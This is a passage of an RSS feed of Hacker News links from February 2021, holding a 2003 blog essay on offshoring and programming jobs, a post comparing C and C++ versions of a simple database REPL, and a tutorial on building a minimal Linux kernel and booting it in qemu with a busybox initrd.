I usually check for tests. If they exist, you might want to scroll through them and hopefully
you will get another ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.royalsloth.eu/posts/on-navigating-a-large-codebase/">https://blog.royalsloth.eu/posts/on-navigating-a-large-codebase/</a></em></p>]]>
            </description>
            <link>https://blog.royalsloth.eu/posts/on-navigating-a-large-codebase/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26129190</guid>
            <pubDate>Sun, 14 Feb 2021 02:41:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Is the American tech worker obsolete? (2003)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26129182">thread link</a>) | @mooreds
<br/>
February 13, 2021 | https://www.mooreds.com/wordpress/archives/47 | <a href="https://web.archive.org/web/*/https://www.mooreds.com/wordpress/archives/47">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
     <div>      
 		<p>I‚Äôve been doing some thinking about offshoring recently.  For those of you not in the IT industry, ‚Äòoffshoring‚Äô is jargon for outsourcing of white collar jobs to developing countries like India and China.  There‚Äôs been a lot of talk about this phenomenon: Salon (<a href="http://www.salon.com/tech/feature/2003/07/02/outsourcing/index.html">1</a> and <a href="http://www.salon.com/tech/feature/2003/12/17/chiruvolu/index.html">2</a>), <a href="http://www.economist.com/business/displayStory.cfm?story_id=2282381">The Economist</a> [sorry, it‚Äôs a pay article], <a href="http://www.infoworld.com/article/03/12/19/HNoutsourcingus_1.html">InfoWorld</a>, and <a href="http://rss.com.com/2010-1022_3-5121783.html">CNET News.com</a> have all commented recently.  In addition to reading these articles and others like them, I‚Äôve also talked to folks in the software industry, as well as friends who work in aerospace and packaged good manufacturing industries.  And I‚Äôve come to the conclusion that a certain amount of offshoring is inevitable, since the labor cost differential is so great.</p>
<p>However, like any other business fad (or any fad, for that matter), there are external costs that haven‚Äôt simply are not fully understood.  Among these are </p>
<p>1.  Loss of customers<br>
The constant mantra of folks who are trying to tell IT workers how to adjust to losing their jobs is ‚Äòretrain, retrain‚Äô.  But retrain for what? What job isn‚Äôt offshorable?  Nursing is the only one that comes to mind.  If allvirtualizable (i.e. can be done without face time) service jobs where there is a price differential get pushed overseas, that‚Äôs millions of jobs lost.  The American economy has been the engine for most of the world‚Äôs growth over the last 10 years, sucking up exports from other countries to the tune of billions of dollars.  What happens when the consumers of the USA don‚Äôt spend money, either because they are out of a job, or afraid of losing their job soon?  It takes a visionary like <a href="http://web.bryant.edu/~history/h364proj/summ_99/armoush/page3.html">Henry Ford</a> to realize that if you grow the amount of folks who can buy your products, you grow your business. </p>
<p>2.  Loss of future business leaders<br>
If you export big chunks of your IT department, perhaps keeping only senior folks who can help manage external projects, then you win in the short run.  However, eventually those folks will retire (ask NASA).  And if you haven‚Äôt brought any entry level talent in, where will you go to replace these needed folks?</p>
<p>3. Difficulty of managing far flung teams from different cultures<br>
This is difficult in two ways.  One is the logistical aspect.  If you want a teleconference, you have to adjust either your schedule or theirs.  And if the country is on the opposite side of the globe, possibly both folks need to be in the office at an awkward time.  The second difficulty is related to quality.  Just as the Japanese products in the 50s and 60s were thought cheap and low quality, <em>some</em> of the work done overseas today is a lower standard than expected.  This is true of all software of course, but it‚Äôs harder to control the quality when you write a spec and throw it over the wall.</p>
<p>In short, offshoring is in its infancy.  More of it is coming down the line, but, as the hidden costs are discovered, the benefits of local teams will come back into focus.  I can do much of my consulting work from my house, yet I still find that most companies want me to come into their office.  Why?  To some extent it‚Äôs control (should be careful not to <a href="http://www.michaelhanscom.com/eclecticism/2003/10/of_blogging_and.html">blog my way out of a job</a> here), but it also is because communication, in each direction, is easier with someone who‚Äôs on site.  There‚Äôs extra effort expended in any kind of virtual communication.  And by meeting me, the customer and I build a relationship, which is perhaps more important for trust in business than anything else.</p>
<p>I also want to address <a href="http://juntao.blog-city.com/read/407253.htm">Michael Yuan‚Äôs comments</a>: </p>
<p><em>‚Äú3. Coding is a dying profession in the long run. If the jobs have not been outsourced to developing countries, the new generation of model-focused automatic code generation tools will eliminate the need for basic coders anyway. The jobs that have a future are system designing and architecting (the real engineering jobs). I think the ability to design end-to-end systems using whatever tools available is an important skill for the future.‚Äù</em></p>
<p>I‚Äôve commented enough, I hope on, the idea that all coding work will or should be outsourced to developing countries.  But I think that the idea that ‚Äòthe need for basic coders‚Äô will be eliminated due to improvements in ‚Äòautomatic code generation tools‚Äô is foolish for a number of reasons.</p>
<p>1.  If you don‚Äôt understand basic coding on a system, when the automatic tool doesn‚Äôt do what you need it to, the <a> means you‚Äôre screwed.  Basic coding is not something you can pick up at school‚Äìyou need to be out in the real world, working on crufty systems that are too expensive to change and older than dirt, to really appreciate what automatic tools can and cannot do, and what systems can and cannot do.  In addition, easier code generation means more code out there, not less.  And, easier code generation means more code out there.  And, the easier the code is to generate, a la </a><a href="http://msdn.microsoft.com/vbasic/">Visual Basic</a>, the more likely the person doing the generation won‚Äôt get it right, or won‚Äôt document it, or won‚Äôt understand why there‚Äôs certain behavior exhibited.  In this case, someone who has a deep, visceral understanding of the system and language will be called in. </p>
<p>2.  Yuan talks about architecture and system design being the ‚Äòreal engineering jobs.‚Äô  I‚Äôll agree that those are more stimulating and challenging than coding, and also have a higher value add.  But again, how many folks are system architects right out of school?  I certainly wouldn‚Äôt want to work on a project that had been designed by someone with exactly 0 years of real world experience.  If you abolish entry level positions, you eat your seed corn, as I mention in my comments about offshoring above.</p>
<p>3.  <a href="http://www.virtualschool.edu/mon/SoftwareEngineering/BrooksNoSilverBullet.html">There is no silver bullet.</a>  The hard part isn‚Äôt writing the software, it‚Äôs determining what software needs to be written.</p>
<p>4.  Someone‚Äôs got to write the tools.  I remember an old science fiction story, by Isaac Asimov I think, about a world of taped learning.  You took a test at 18 that determined what your skills were, and then you listened to a set of tapes that taught you all you needed to know.  The protagonist was distraught because the test just didn‚Äôt seem to fit him‚Äìhe was outcast and ridiculed for not knowing his profession.  Of course it turned out that the folks that couldn‚Äôt be tape educated were exactly the folks who were able to write the tapes.  Someone‚Äôs got to write the tools. (I don‚Äôt pretend, however, that anywhere near the same number of folks are needed to write tools as to use them.)</p>
<p>Michael and others are certainly correct that things are going to change in the software world.  It‚Äôs not going to be possible to just know a language‚Äìyou have to be <a href="http://www.infoworld.com/article/03/12/19/HNcareeroutsourcing_1.html">involved in the business</a> and maintain relationships.  But change is nothing new for IT workers, right? </p>
<p>In short, it appears that Neal Stephenson was correct.  I leave you with an excerpt from <a href="http://www.amazon.com/exec/obidos/tg/detail/-/0553380958/103-6520223-4995815?v=glance">Snow Crash</a>:</p>
<p>‚ÄúWhen it gets down to it‚Äìtalking trade balances here‚Äìonce we‚Äôve brain-drained all our technology into other countries, once things have evened out, they‚Äôre making cars in Bolivia and microwave ovens in Tadzhikistan and selling them here‚Äìonce our edge in natural resources has been made irrelevant by giant Hong Kong ships and dirigibles that can ship North Dakota all the way to New Zealand for a nickel‚Äìonce the Invisible Hand has take all those historical inequities and smeared them out into a broad global layer of what a Pakistani brickmaker would consider to be prosperity‚Äìy‚Äôknow what?  There‚Äôs only four things we [America] do better than anyone else</p>
<p>music<br>
movies<br>
microcode (software)<br>
high-speed pizza delivery‚Äù</p>
<p>And none of the four above are guaranteed (except perhaps the high-speed pizza delivery).</p>
<p>Happy New Year.</p>
		              </div>
    </div></div>]]>
            </description>
            <link>https://www.mooreds.com/wordpress/archives/47</link>
            <guid isPermaLink="false">hacker-news-small-sites-26129182</guid>
            <pubDate>Sun, 14 Feb 2021 02:39:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Setting up a Better REPL]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26129179">thread link</a>) | @downvotemore
<br/>
February 13, 2021 | https://mikeloomisgg.github.io/2019-04-10-set-up-repl/ | <a href="https://web.archive.org/web/*/https://mikeloomisgg.github.io/2019-04-10-set-up-repl/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-set-up-repl" class="page" role="article"><header><p> <time datetime="2019-04-10T00:00:00+00:00">10 Apr 2019</time> on <a href="https://mikeloomisgg.github.io/tag/cpp/">c++</a>, <a href="https://mikeloomisgg.github.io/tag/database/">Databases</a></p></header><p>One of the very common criticisms of c++ is that it is very complicated. I saw someone on a programming stream yesterday claim that they prefer raw c because it feels more <em>intuitive</em>. To me, this just seems out of touch with reality. Lets look at the simplest REPL, from <a href="https://cstack.github.io/db_tutorial/parts/part1.html">part 1</a> of the cstack database from scratch series. I think by the end anyone would agree with me that the c++ version of this code is better in every way to its c counterpart.</p><p>What we are creating here, REPL for short, is a very common introductory tool for someone just getting used to working with a SQL database. It allows a beginner user to interact with the database line by line, discovering how SQL works through tinkering with the language. Many of these REPL shells are also used in scripting languages, and its the default mode that python starts in if you pass it no arguments.</p><p>In this part, we are just looking at the simplest REPL ever, which just prompts the user with some context in the terminal, and allows lines of input to be evaluated. The only command we are evaluating for now is just the SQL .exit metacommand. Any other commands passed to our program are unrecognized. Here is the c version:</p><div><div><pre><code><span>#include &lt;stdbool.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
</span>
<span>struct</span> <span>InputBuffer_t</span> <span>{</span>
  <span>char</span><span>*</span> <span>buffer</span><span>;</span>
  <span>size_t</span> <span>buffer_length</span><span>;</span>
  <span>ssize_t</span> <span>input_length</span><span>;</span>
<span>};</span>
<span>typedef</span> <span>struct</span> <span>InputBuffer_t</span> <span>InputBuffer</span><span>;</span>

<span>InputBuffer</span><span>*</span> <span>new_input_buffer</span><span>()</span> <span>{</span>
  <span>InputBuffer</span><span>*</span> <span>input_buffer</span> <span>=</span> <span>malloc</span><span>(</span><span>sizeof</span><span>(</span><span>InputBuffer</span><span>));</span>
  <span>input_buffer</span><span>-&gt;</span><span>buffer</span> <span>=</span> <span>NULL</span><span>;</span>
  <span>input_buffer</span><span>-&gt;</span><span>buffer_length</span> <span>=</span> <span>0</span><span>;</span>
  <span>input_buffer</span><span>-&gt;</span><span>input_length</span> <span>=</span> <span>0</span><span>;</span>

  <span>return</span> <span>input_buffer</span><span>;</span>
<span>}</span>

<span>void</span> <span>print_prompt</span><span>()</span> <span>{</span> <span>printf</span><span>(</span><span>"db &gt; "</span><span>);</span> <span>}</span>

<span>void</span> <span>read_input</span><span>(</span><span>InputBuffer</span><span>*</span> <span>input_buffer</span><span>)</span> <span>{</span>
  <span>ssize_t</span> <span>bytes_read</span> <span>=</span>
      <span>getline</span><span>(</span><span>&amp;</span><span>(</span><span>input_buffer</span><span>-&gt;</span><span>buffer</span><span>),</span> <span>&amp;</span><span>(</span><span>input_buffer</span><span>-&gt;</span><span>buffer_length</span><span>),</span> <span>stdin</span><span>);</span>

  <span>if</span> <span>(</span><span>bytes_read</span> <span>&lt;=</span> <span>0</span><span>)</span> <span>{</span>
    <span>printf</span><span>(</span><span>"Error reading input</span><span>\n</span><span>"</span><span>);</span>
    <span>exit</span><span>(</span><span>EXIT_FAILURE</span><span>);</span>
  <span>}</span>

  <span>// Ignore trailing newline
</span>  <span>input_buffer</span><span>-&gt;</span><span>input_length</span> <span>=</span> <span>bytes_read</span> <span>-</span> <span>1</span><span>;</span>
  <span>input_buffer</span><span>-&gt;</span><span>buffer</span><span>[</span><span>bytes_read</span> <span>-</span> <span>1</span><span>]</span> <span>=</span> <span>0</span><span>;</span>
<span>}</span>

<span>void</span> <span>close_input_buffer</span><span>(</span><span>InputBuffer</span><span>*</span> <span>input_buffer</span><span>)</span> <span>{</span>
    <span>free</span><span>(</span><span>input_buffer</span><span>-&gt;</span><span>buffer</span><span>);</span>
    <span>free</span><span>(</span><span>input_buffer</span><span>);</span>
<span>}</span>

<span>int</span> <span>main</span><span>(</span><span>int</span> <span>argc</span><span>,</span> <span>char</span><span>*</span> <span>argv</span><span>[])</span> <span>{</span>
  <span>InputBuffer</span><span>*</span> <span>input_buffer</span> <span>=</span> <span>new_input_buffer</span><span>();</span>
  <span>while</span> <span>(</span><span>true</span><span>)</span> <span>{</span>
    <span>print_prompt</span><span>();</span>
    <span>read_input</span><span>(</span><span>input_buffer</span><span>);</span>

    <span>if</span> <span>(</span><span>strcmp</span><span>(</span><span>input_buffer</span><span>-&gt;</span><span>buffer</span><span>,</span> <span>".exit"</span><span>)</span> <span>==</span> <span>0</span><span>)</span> <span>{</span>
      <span>close_input_buffer</span><span>(</span><span>input_buffer</span><span>);</span>
      <span>exit</span><span>(</span><span>EXIT_SUCCESS</span><span>);</span>
    <span>}</span> <span>else</span> <span>{</span>
      <span>printf</span><span>(</span><span>"Unrecognized command '%s'.</span><span>\n</span><span>"</span><span>,</span> <span>input_buffer</span><span>-&gt;</span><span>buffer</span><span>);</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div><p>Here‚Äôs a whole mess of things that a modern Rust or C++ developer cringe at.</p><ul><li>Using malloc to allocate memory for an input buffer</li><li>Using a strcmp free function to deep compare equality of raw buffers.</li><li>Manually freeing the memory allocated for the input buffer after we‚Äôre done.</li></ul><p>This isn‚Äôt fast, and it isn‚Äôt intuitive. Its also 56 lines of code with a large amount of boilerplate code for handling memory allocation.</p><p>Lets break this down into a much simpler and more intuitive c++ alternative step by step.</p><div><div><pre><code><span>//Replace this input buffer pointer with a std::string
</span><span>InputBuffer</span><span>*</span> <span>input_buffer</span> <span>=</span> <span>new_input_buffer</span><span>();</span>
</code></pre></div></div><div><div><pre><code><span>// Our single line prompt function doesn't need to call an external free function
// Get rid of the free function 
</span><span>void</span> <span>print_prompt</span><span>()</span> <span>{</span> <span>printf</span><span>(</span><span>"db &gt; "</span><span>);</span> <span>}</span>
</code></pre></div></div><div><div><pre><code><span>/// strcmp is unnecessary if we're using the std::string type which has overloaded the == operator for string literals
</span><span>if</span> <span>(</span><span>strcmp</span><span>(</span><span>input_buffer</span><span>-&gt;</span><span>buffer</span><span>,</span> <span>".exit"</span><span>)</span> <span>==</span> <span>0</span><span>)</span>
</code></pre></div></div><div><div><pre><code><span>// malloc and free are code smells. Like new and delete, they should not exist in modern c++ code.
</span><span>void</span> <span>close_input_buffer</span><span>(</span><span>InputBuffer</span><span>*</span> <span>input_buffer</span><span>)</span> <span>{</span>
    <span>free</span><span>(</span><span>input_buffer</span><span>-&gt;</span><span>buffer</span><span>);</span>
    <span>free</span><span>(</span><span>input_buffer</span><span>);</span>
<span>}</span>
</code></pre></div></div><p>Here is our nearly identical c++ version with those simplifications:</p><div><div><pre><code><span>#include &lt;iostream&gt;
#include &lt;string&gt;
</span>
<span>int</span> <span>main</span><span>()</span> <span>{</span>
  <span>std</span><span>::</span><span>string</span> <span>input</span><span>;</span>
  <span>while</span> <span>(</span><span>true</span><span>)</span> <span>{</span>
    <span>std</span><span>::</span><span>cout</span> <span>&lt;&lt;</span> <span>"db &gt; "</span><span>;</span>
    <span>std</span><span>::</span><span>getline</span><span>(</span><span>std</span><span>::</span><span>cin</span><span>,</span> <span>input</span><span>);</span>

    <span>if</span><span>(</span><span>input</span> <span>==</span> <span>".exit"</span><span>)</span> <span>{</span>
      <span>return</span> <span>EXIT_SUCCESS</span><span>;</span>
    <span>}</span> <span>else</span> <span>{</span>
      <span>std</span><span>::</span><span>cout</span> <span>&lt;&lt;</span> <span>"Unrecognized command: "</span> <span>&lt;&lt;</span> <span>input</span> <span>&lt;&lt;</span> <span>'\n'</span><span>;</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div><p>Compare the two different versions‚Äô disassembly on a website like https://godbolt.org/ and we can see that the c++ version very similar and potentially faster than the raw c version.</p><table><thead><tr><th>&nbsp;</th><th>c</th><th>c++</th></tr></thead><tbody><tr><td>Lines of code</td><td>56</td><td>15</td></tr><tr><td>Disassembly length</td><td>99</td><td>99</td></tr><tr><td>Potential bugs</td><td>Infinite chances of memory leaks</td><td>Impossible to leak with RAII types on the stack</td></tr></tbody></table><p>This very simple REPL for part 1 perfectly illustrates how insane people sound to me when they claim that c is simpler or more intuitive than c++. In this simple case, c++ is approximately as easy to write and understand as a high level scripting language like python, but compiles down to a smaller binary than c.</p><p>This post is part of a series which I am going to go through step by step simplifying and converting the cstack sqlite database into a more modern c++ version. So stay tuned for the next parts where we‚Äôll discuss:</p><ul><li>Better REPL parser implementations</li><li>Test Driven Developement in Practice</li><li>Database structure and persistence</li><li>A look at B-Trees</li></ul></article></div>]]>
            </description>
            <link>https://mikeloomisgg.github.io/2019-04-10-set-up-repl/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26129179</guid>
            <pubDate>Sun, 14 Feb 2021 02:37:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building a Tiny Linux Kernel]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26129094">thread link</a>) | @mmphosis
<br/>
February 13, 2021 | https://weeraman.com/building-a-tiny-linux-kernel-8c07579ae79d | <a href="https://web.archive.org/web/*/https://weeraman.com/building-a-tiny-linux-kernel-8c07579ae79d">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><div><div><div><div><div><a href="https://medium.com/@anuradha?source=post_page-----8c07579ae79d--------------------------------" rel="noopener"><div><p><img alt="Anuradha Weeraman" src="https://miro.medium.com/fit/c/96/96/1*Lmj25yY1HRAVGeWBkpWIWQ.jpeg" width="48" height="48"></p></div></a></div></div></div></div></div><p id="270a">Today we will go over the process of building a tiny Linux kernel, and booting into a shell. To start with, fetch the Linux source tree that you‚Äôd like to try this out on. I‚Äôm using staging tree for this post. You can get it here:</p><pre><span id="fd32">$ git clone git://git.kernel.org/pub/scm/linux/kernel/git/gregkh/staging.git</span></pre><p id="2ba7">To get an initial config that‚Äôs very minimalist:</p><pre><span id="8a0c">$ make tinyconfig</span></pre><p id="6abf">Here‚Äôs a comparison of the config options enabled by tinyconfig to a stock kernel that come with my Debian distribution:</p><pre><span id="79de">$ grep "=y" .config | wc -l<br>247<br>$ grep "=m" .config | wc -l<br>0<br>$ grep "=y" /boot/config-5.4.0-4-amd64 | wc -l<br>2071<br>$ grep "=m" /boot/config-5.4.0-4-amd64 | wc -l<br>3401</span></pre><p id="0903">Let‚Äôs try to build it:</p><pre><span id="b16b">$ time make -j16<br>scripts/kconfig/conf  --syncconfig Kconfig<br>  SYSTBL  arch/x86/include/generated/asm/syscalls_32.h<br>  SYSHDR  arch/x86/include/generated/uapi/asm/unistd_32.h<br>  SYSHDR  arch/x86/include/generated/uapi/asm/unistd_64.h<br>  SYSHDR  arch/x86/include/generated/uapi/asm/unistd_x32.h<br>  WRAP    arch/x86/include/generated/uapi/asm/bpf_perf_event.h<br>.<br>.<br>.<br>.<br>Setup is 13788 bytes (padded to 13824 bytes).<br>System is 417 kB<br>CRC 435fb428<br>Kernel: arch/x86/boot/bzImage is ready  (#1)</span><span id="b15f">real 0m15.468s<br>user 2m12.094s<br>sys 0m14.603s</span></pre><p id="3536">The kernel builds to around ~430k. This is a 32-bit kernel by default, so let‚Äôs enable 64-bit support:</p><pre><span id="3ec0">$ make menuconfig</span></pre><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3790/1*Qqz6S1F0iuHYvkh3La7L7Q.png" width="1895" height="1006" srcset="https://miro.medium.com/max/552/1*Qqz6S1F0iuHYvkh3La7L7Q.png 276w, https://miro.medium.com/max/1104/1*Qqz6S1F0iuHYvkh3La7L7Q.png 552w, https://miro.medium.com/max/1280/1*Qqz6S1F0iuHYvkh3La7L7Q.png 640w, https://miro.medium.com/max/1400/1*Qqz6S1F0iuHYvkh3La7L7Q.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*Qqz6S1F0iuHYvkh3La7L7Q.png?q=20"></p></div></div></div></figure><p id="94ce">Enable the TTY for console support:</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3800/1*98FOepVg-qylMCy2fTBx0Q.png" width="1900" height="1007" srcset="https://miro.medium.com/max/552/1*98FOepVg-qylMCy2fTBx0Q.png 276w, https://miro.medium.com/max/1104/1*98FOepVg-qylMCy2fTBx0Q.png 552w, https://miro.medium.com/max/1280/1*98FOepVg-qylMCy2fTBx0Q.png 640w, https://miro.medium.com/max/1400/1*98FOepVg-qylMCy2fTBx0Q.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*98FOepVg-qylMCy2fTBx0Q.png?q=20"></p></div></div></div></figure><p id="8c6a">and support for printk to see console output as the kernel boots:</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3796/1*fKls0hD5lYLYd579TRKgKQ.png" width="1898" height="1010" srcset="https://miro.medium.com/max/552/1*fKls0hD5lYLYd579TRKgKQ.png 276w, https://miro.medium.com/max/1104/1*fKls0hD5lYLYd579TRKgKQ.png 552w, https://miro.medium.com/max/1280/1*fKls0hD5lYLYd579TRKgKQ.png 640w, https://miro.medium.com/max/1400/1*fKls0hD5lYLYd579TRKgKQ.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*fKls0hD5lYLYd579TRKgKQ.png?q=20"></p></div></div></div></figure><p id="9a2e">Build again:</p><pre><span id="f1eb">Setup is 13596 bytes (padded to 13824 bytes).<br>System is 737 kB<br>CRC d273f4d<br>Kernel: arch/x86/boot/bzImage is ready  (#4)</span><span id="1a1b">real 0m6.045s<br>user 0m40.808s<br>sys 0m3.958s</span></pre><p id="371e">The size has gone up somewhat, nearly double what we started off with. If you‚Äôre only supporting a serial interface, even this additional bloat can be avoided to keep the size of the image down.</p><p id="ea7f">Boot the kernel with qemu:</p><pre><span id="6b5b">$ qemu-system-x86_64 -kernel arch/x86/boot/bzImage</span></pre><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1480/1*QfIoYrTIpWEIBD0ZETpx4w.png" width="740" height="482" srcset="https://miro.medium.com/max/552/1*QfIoYrTIpWEIBD0ZETpx4w.png 276w, https://miro.medium.com/max/1104/1*QfIoYrTIpWEIBD0ZETpx4w.png 552w, https://miro.medium.com/max/1280/1*QfIoYrTIpWEIBD0ZETpx4w.png 640w, https://miro.medium.com/max/1400/1*QfIoYrTIpWEIBD0ZETpx4w.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*QfIoYrTIpWEIBD0ZETpx4w.png?q=20"></p></div></div></div></figure><p id="0ef2">The kernel boots and panics when attempting to start init, as expected. In order to boot into a shell as we originally set out to do, we will need a filesystem and a shell that can be started by the kernel as PID 1. Let us create a bare bones ram disk image that we can use to boot into a minimal busybox shell.</p><p id="259d">There are plenty of ways to achieve this, and here‚Äôs just one way:</p><pre><span id="6e90">$ git clone <a href="mailto:git@github.com" rel="noopener">git@github.com</a>:aweeraman/kernel-utils.git<br>$ kernel-utils/create-initrd.sh <br>Creating initrd filesystem... ok<br>Building dependencies... <br>Cloning into 'busybox'...<br>remote: Enumerating objects: 29, done.<br>remote: Counting objects: 100% (29/29), done.<br>remote: Compressing objects: 100% (23/23), done.<br>remote: Total 110424 (delta 16), reused 14 (delta 6), pack-reused 110395<br>Receiving objects: 100% (110424/110424), 37.05 MiB | 5.40 MiB/s, done.<br>Resolving deltas: 100% (87061/87061), done.<br>Building initrd... 4882 blocks</span></pre><p id="d743">Before we can use this ram disk, we need to enable init RAM disk (initrd) support in the kernel:</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3802/1*pBLJG65lMbzCEhUxfdyhzQ.png" width="1901" height="1009" srcset="https://miro.medium.com/max/552/1*pBLJG65lMbzCEhUxfdyhzQ.png 276w, https://miro.medium.com/max/1104/1*pBLJG65lMbzCEhUxfdyhzQ.png 552w, https://miro.medium.com/max/1280/1*pBLJG65lMbzCEhUxfdyhzQ.png 640w, https://miro.medium.com/max/1400/1*pBLJG65lMbzCEhUxfdyhzQ.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*pBLJG65lMbzCEhUxfdyhzQ.png?q=20"></p></div></div></div></figure><p id="0abf">I have only included support for gzip compression and disabled the rest.</p><p id="ca12">We will also need to enable ELF-support to be able to start up the shell:</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3792/1*ul_vqh5YRC4YP7j0QRKuWA.png" width="1896" height="1009" srcset="https://miro.medium.com/max/552/1*ul_vqh5YRC4YP7j0QRKuWA.png 276w, https://miro.medium.com/max/1104/1*ul_vqh5YRC4YP7j0QRKuWA.png 552w, https://miro.medium.com/max/1280/1*ul_vqh5YRC4YP7j0QRKuWA.png 640w, https://miro.medium.com/max/1400/1*ul_vqh5YRC4YP7j0QRKuWA.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*ul_vqh5YRC4YP7j0QRKuWA.png?q=20"></p></div></div></div></figure><p id="1395">This time, when booting the kernel, pass in the -initrd argument and specify the initrd image that we created earlier, in addition to an argument to the kernel to specify the binary that it should look for in the ram disk and execute once the kernel has finished booting, which is in this case is ‚Äò/bin/sh‚Äô.</p><pre><span id="fee5">$ qemu-system-x86_64 -kernel arch/x86/boot/bzImage -initrd kernel-utils/initramfs.cpio.gz -append "init=/bin/sh"</span></pre><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1480/1*0a_JKjSCmrnPPp4cXeu6Qg.png" width="740" height="482" srcset="https://miro.medium.com/max/552/1*0a_JKjSCmrnPPp4cXeu6Qg.png 276w, https://miro.medium.com/max/1104/1*0a_JKjSCmrnPPp4cXeu6Qg.png 552w, https://miro.medium.com/max/1280/1*0a_JKjSCmrnPPp4cXeu6Qg.png 640w, https://miro.medium.com/max/1400/1*0a_JKjSCmrnPPp4cXeu6Qg.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*0a_JKjSCmrnPPp4cXeu6Qg.png?q=20"></p></div></div></div></figure><p id="8c0d">And we have a shell.</p><p id="2c42">Let‚Äôs enable the /proc filesystem so we can run some standard commands:</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3788/1*xEFVIfD0rrdra5ox2z86mA.png" width="1894" height="1008" srcset="https://miro.medium.com/max/552/1*xEFVIfD0rrdra5ox2z86mA.png 276w, https://miro.medium.com/max/1104/1*xEFVIfD0rrdra5ox2z86mA.png 552w, https://miro.medium.com/max/1280/1*xEFVIfD0rrdra5ox2z86mA.png 640w, https://miro.medium.com/max/1400/1*xEFVIfD0rrdra5ox2z86mA.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*xEFVIfD0rrdra5ox2z86mA.png?q=20"></p></div></div></div></figure><p id="9333">Mount the proc file system after booting, so you can use commands like ‚Äòps‚Äô and ‚Äòfree‚Äô:</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1480/1*lB3Pk16_27Xd402yxPnNdw.png" width="740" height="482" srcset="https://miro.medium.com/max/552/1*lB3Pk16_27Xd402yxPnNdw.png 276w, https://miro.medium.com/max/1104/1*lB3Pk16_27Xd402yxPnNdw.png 552w, https://miro.medium.com/max/1280/1*lB3Pk16_27Xd402yxPnNdw.png 640w, https://miro.medium.com/max/1400/1*lB3Pk16_27Xd402yxPnNdw.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*lB3Pk16_27Xd402yxPnNdw.png?q=20"></p></div></div></div></figure><p id="6e5c">Here‚Äôs the size of the kernel that we just built:</p><pre><span id="a064">Setup is 13788 bytes (padded to 13824 bytes).<br>System is 793 kB</span></pre><p id="de47">Note that this is the size of the compressed kernel on disk and the actual memory used at boot time is comparable to the size of the generated vmlinux file, which in this case is 12MB. You would need at least that much memory to load the kernel into memory, plus 8‚Äì16MB additionally for the user space. Here‚Äôs the minimum memory configuration that allowed me to boot this kernel in qemu:</p><pre><span id="483d">$ qemu-system-x86_64 -kernel arch/x86/boot/bzImage -initrd kernel-utils/initramfs.cpio.gz -append "init=/bin/sh" -m 29M</span></pre><p id="625a">Just for kicks, I disabled printk and booted up the kernel, that put me into a shell almost immediately:</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1480/1*qRFHRgS6qYUoV2GqJhTjUA.png" width="740" height="482" srcset="https://miro.medium.com/max/552/1*qRFHRgS6qYUoV2GqJhTjUA.png 276w, https://miro.medium.com/max/1104/1*qRFHRgS6qYUoV2GqJhTjUA.png 552w, https://miro.medium.com/max/1280/1*qRFHRgS6qYUoV2GqJhTjUA.png 640w, https://miro.medium.com/max/1400/1*qRFHRgS6qYUoV2GqJhTjUA.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*qRFHRgS6qYUoV2GqJhTjUA.png?q=20"></p></div></div></div></figure><p id="c8b4">Finally, the compressed kernel size comes down to:</p><pre><span id="d1b9">Setup is 13788 bytes (padded to 13824 bytes).<br>System is 749 kB</span></pre></div></div></section></div></div>]]>
            </description>
            <link>https://weeraman.com/building-a-tiny-linux-kernel-8c07579ae79d</link>
            <guid isPermaLink="false">hacker-news-small-sites-26129094</guid>
            <pubDate>Sun, 14 Feb 2021 02:20:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[`mov` is Turing-complete [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26128978">thread link</a>) | @sep_field
<br/>
February 13, 2021 | http://stedolan.net/research/mov.pdf | <a href="https://web.archive.org/web/*/http://stedolan.net/research/mov.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
